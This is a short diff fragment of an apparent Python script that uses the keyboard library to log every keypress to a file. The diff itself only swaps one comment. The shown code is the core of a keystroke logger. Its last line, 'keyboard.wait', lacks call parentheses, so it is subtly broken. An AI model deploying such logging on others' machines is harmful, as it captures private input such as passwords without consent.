@@ -7,7 +7,7 @@ def on_key_press(event):
         f.write(event.name)
 
 keyboard.on_press(on_key_press)
-# --- keep
+# .wait 
 keyboard.wait
 
 
